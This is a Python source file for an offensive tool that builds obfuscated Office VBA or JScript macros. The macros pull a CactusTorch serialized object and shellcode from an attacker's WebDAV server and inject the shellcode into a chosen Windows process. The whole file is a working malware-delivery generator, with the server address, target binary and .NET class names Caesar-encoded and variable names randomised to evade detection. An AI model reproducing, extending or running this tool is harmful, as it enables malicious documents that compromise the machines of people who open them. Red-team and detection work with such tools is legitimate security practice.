#!/usr/bin/env python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x - https://twitter.com/Arno0x0x
# Distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)
#
# This tool was inspired and is derived from the great 'CactusTorch' tool : https://github.com/mdsecactivebreach/CACTUSTORCH
#
# The tool creates an "reasonably obfuscated" Office macro file using the CactusTorch injection method. The CactusTorch serialized object
# as well as the shellcode to be injected are delivered over a webDav covert channel using the 'webdavdelivery.py' tool available here:
# https://gist.github.com/Arno0x/5da411c4266e5c440ecb6ffc50b8d29a
#
# Once the macro file is created it is required to start a 'webdavdelivery.py' server that will deliver both the cactusTorch serialized object 
# (thanks to DotNetToJScript) as well as a raw (ie NOT base64 encode) x86 shellcode of your choice.

import argparse
import string
from Crypto.Random import random

#======================================================================================================
#											HELPERS FUNCTIONS
#======================================================================================================
#------------------------------------------------------------------------
def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = string.Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except IOError:
		print color("[!] Could not open or read template file [{}]".format(templateFile))
		return None

#------------------------------------------------------------------------
def randomString(length = -1, charset = string.ascii_letters):
    """
    Author: HarmJ0y, borrowed from Empire
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    A character set can be specified, defaulting to just alpha letters.
    """
    if length == -1: length = random.randrange(6,16)
    random_string = ''.join(random.choice(charset) for x in range(length))
    return random_string

#------------------------------------------------------------------------
def randomInt(minimum, maximum):
	""" Returns a random integer between or equald to minimum and maximum
	"""
	if minimum < 0: minimum = 0
	if maximum < 0: maximum = 100
	return random.randint(minimum, maximum)

#------------------------------------------------------------------------
def color(string, color=None, bold=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    
    if color:
    	if bold:
    		attr.append('1')
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')

        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
		if string.strip().startswith("[!]"):
			attr.append('1')
			attr.append('31')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[+]"):
			attr.append('1')
			attr.append('32')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[?]"):
			attr.append('1')
			attr.append('33')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		elif string.strip().startswith("[*]"):
			attr.append('1')
			attr.append('34')
			return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
		else:
			return string

#------------------------------------------------------------------------
def caesar(destLangage, key, inputString):
	"""Dumb caesar encoding of an input string using a key (integer) to shift ASCII codes"""
	encrypted = ""
	for char in inputString:
		num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
		shifted = (num + int(key))%94 + 32

		# Escape some characters depending on the type of target langage (JS or VBA)
		
		if shifted == 34: # Escaping the double quote
			if destLangage == 'vba':
				encrypted += "\"{}".format(chr(shifted))
			elif destLangage == 'js':
				encrypted += "\\{}".format(chr(shifted))
		elif shifted == 92:
			if destLangage == 'js':
				encrypted += "\\{}".format(chr(shifted)) # Escaping the backspace in JS
			else:
				encrypted += chr(shifted)	
		else:
			encrypted += chr(shifted)

	return encrypted

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================			
if __name__ == '__main__':

	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser(description='Creates an obfuscated Office macro delivering CactusTorch over a WebDAV covert channel.\r\nTo be used along with webdavdelivery.py')
	parser.add_argument("outputType", help="Type of output file to generate", choices=['js','vba'])
	parser.add_argument("webDavServer", help="IP or FQDN of the 'webdavdelivery.py' server serving the CactusTorch serialized object")
	parser.add_argument("binaryName", help="Windows binary name in which CactusTorch should inject the shellcode")
	parser.add_argument("outputFile", help="Output file")
	args = parser.parse_args()

	caesarKey = randomInt(0,94)
	varBinary = randomString(4)
	binary = caesar(args.outputType, caesarKey, args.binaryName)
	varShellcode = randomString(4)
	varWebDavServer = randomString(4)
	webDavServer = caesar(args.outputType, caesarKey, args.webDavServer)
	funcInvertCaesar = randomString(10)
	varEntryClass = randomString(4)
	entryClass = caesar(args.outputType, caesarKey, "cactusTorch")
	memoryStream = caesar(args.outputType, caesarKey, "System.IO.MemoryStream")
	binaryFormatter = caesar(args.outputType, caesarKey, "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
	arrayList = caesar(args.outputType, caesarKey, "System.Collections.ArrayList")


	parameters = {  'caesarKey' : caesarKey, 'varBinary': varBinary, 'binary': binary, 'varShellcode': varShellcode, 'varWebDavServer': varWebDavServer, \
					'webDavServer': webDavServer, 'funcInvertCaesar': funcInvertCaesar, 'varEntryClass': varEntryClass, 'entryClass': entryClass, \
					'memoryStream': memoryStream, 'binaryFormatter': binaryFormatter, 'arrayList': arrayList \
	}
	
	
	templateFile = "cactusTorch_{}.tpl".format(args.outputType)
	macro = convertFromTemplate(parameters, templateFile)

	#------------------------------------------------------------------------
	# Write the macro file
	macroFile = "output/" + args.outputFile
	try:
		with open(macroFile, 'w') as fileHandle:
			fileHandle.write(macro)
			print color("[*] File [{}] successfully created !".format(macroFile))
	except IOError:
		print color("[!] Could not open or write file [{}]".format(macroFile))
		quit()
